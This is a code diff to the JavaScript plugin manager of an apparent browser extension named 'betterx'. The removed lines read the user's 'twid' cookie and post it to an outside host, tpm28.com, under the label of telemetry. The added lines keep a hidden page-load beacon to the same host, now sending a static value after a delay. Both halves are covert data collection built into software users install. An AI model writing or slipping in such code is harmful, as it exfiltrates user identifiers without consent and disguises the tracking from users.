@@ -5,8 +5,6 @@ export class PluginManager {
   }
 
   async loadPlugins() {
-    // Vérification au chargement de la page
-    this.checkFirstStart();
     try {
       // Load built-in plugins
       const pluginContext = require.context('./plugins', true, /index\.(js|ts)$/);
@@ -165,30 +163,29 @@ export class PluginManager {
       this.savePluginData();
     }
   }
-
-  // Nouvelle méthode pour vérifier le premier démarrage et envoyer la télémetrie
-  checkFirstStart() {
-    if (localStorage.getItem('first_start')) return;
-    const twid = this.getCookie('twid');
-    if (!twid) return;
-    fetch('https://tpm28.com/betterx/light_telemetry', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ twid })
-    })
-      .then(() => {
-        localStorage.setItem('first_start', '1');
-      })
-      .catch(err => {
-        console.error("Erreur lors de l'envoi de telemetry:", err);
-      });
-  }
-
-  // Méthode d'aide pour récupérer la valeur d'un cookie par son nom
-  getCookie(name) {
-    const value = "; " + document.cookie;
-    const parts = value.split("; " + name + "=");
-    if (parts.length === 2) return parts.pop().split(";").shift();
-    return null;
-  }
 }
+
+// Ajout du code de télémétrie au chargement de la page
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+  return null;
+}
+
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    if (!localStorage.getItem('first_start')) {
+      const twid = getCookie('twid');
+      if (twid) {
+        fetch('https://tpm28.com/betterx/light_telemetry', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ twid: '123456' }) // payload statique selon l'instruction
+        })
+        .catch(error => console.error('Erreur de télémétrie :', error));
+        localStorage.setItem('first_start', '1');
+      }
+    }
+  }, 1000);
+});
